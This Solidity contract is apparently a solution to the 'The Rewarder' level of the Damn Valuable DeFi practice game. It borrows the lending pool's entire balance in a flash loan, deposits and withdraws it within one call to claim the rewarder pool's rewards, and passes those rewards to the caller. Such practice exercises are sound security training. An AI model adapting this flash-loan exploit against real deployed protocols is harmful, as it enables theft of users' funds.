// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract ReceiveAttack {
    DamnValuableToken liquidityToken;
    TheRewarderPool rewarderPool;

    uint256 public rewardAmount;

    constructor(address _liquidityToken, address _rewarderPool) {
        liquidityToken = DamnValuableToken(_liquidityToken);

        rewarderPool = TheRewarderPool(_rewarderPool);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), type(uint256).max);

        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);

        liquidityToken.transfer(msg.sender, amount);
    }

    function attackRewardPool(address _flashPool) external {
        uint256 _amount = liquidityToken.balanceOf(_flashPool);

        FlashLoanerPool(_flashPool).flashLoan(_amount);
    }

    function distributeRewards() external returns (uint256 rewards) {
        rewardAmount = rewarderPool.distributeRewards();

        rewarderPool.rewardToken().transfer(msg.sender, rewardAmount);
        return rewardAmount;
    }
}
